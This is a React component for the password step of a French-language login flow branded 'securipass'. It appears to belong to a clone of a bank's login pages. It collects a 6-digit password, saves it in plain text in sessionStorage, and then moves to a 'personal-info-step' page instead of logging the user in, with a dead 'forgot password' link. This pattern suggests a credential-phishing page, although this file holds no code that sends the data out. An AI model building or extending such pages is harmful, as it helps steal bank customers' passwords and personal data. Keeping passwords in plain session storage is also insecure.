import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '../components/ui/card';
import { Alert, AlertDescription } from '../components/ui/alert';
import { Lock } from 'lucide-react';
import NumericKeypad from '../components/NumericKeypad';

const PasswordStep = () => {
  const navigate = useNavigate();
  const [password, setPassword] = useState('');

  useEffect(() => {
    // Check if identifier was entered
    const identifier = sessionStorage.getItem('securipass_identifier');
    if (!identifier) {
      navigate('/login');
    }
  }, [navigate]);

  const handleNumberClick = (num) => {
    if (password.length < 6) {
      setPassword(password + num);
    }
  };

  const handleDelete = () => {
    setPassword(password.slice(0, -1));
  };

  const handleSubmit = () => {
    if (password.length === 6) {
      // Store in sessionStorage
      sessionStorage.setItem('securipass_password', password);
      navigate('/personal-info-step');
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-red-50 to-white py-12 px-4">
      <div className="max-w-2xl mx-auto">
        <Alert className="mb-8 border-[#e60028] bg-[#e60028]/5">
          <Lock className="h-5 w-5 text-[#e60028]" />
          <AlertDescription className="text-[#e60028] ml-2">
            <strong>Session sécurisée.</strong> Ne partagez jamais votre mot de passe.
          </AlertDescription>
        </Alert>

        <Card className="shadow-2xl border-none">
          <CardHeader className="space-y-4 pb-8">
            <div className="w-16 h-16 bg-gradient-to-br from-[#e60028] to-[#c00020] rounded-full flex items-center justify-center mx-auto shadow-lg">
              <Lock className="text-white" size={32} />
            </div>
            <CardTitle className="text-3xl font-bold text-center text-gray-900">
              Mot de passe
            </CardTitle>
            <CardDescription className="text-center text-base text-gray-600">
              Saisissez votre mot de passe à 6 chiffres
            </CardDescription>
          </CardHeader>

          <CardContent className="pb-8">
            <NumericKeypad
              value={password}
              maxLength={6}
              onNumberClick={handleNumberClick}
              onDelete={handleDelete}
              onSubmit={handleSubmit}
              submitLabel="Suivant"
            />

            <div className="mt-8 pt-6 border-t border-gray-200 text-center">
              <p className="text-sm text-gray-600">
                <a href="#" className="text-[#e60028] hover:underline font-medium">
                  Mot de passe oublié ?
                </a>
              </p>
            </div>
          </CardContent>
        </Card>
      </div>
    </div>
  );
};

export default PasswordStep;
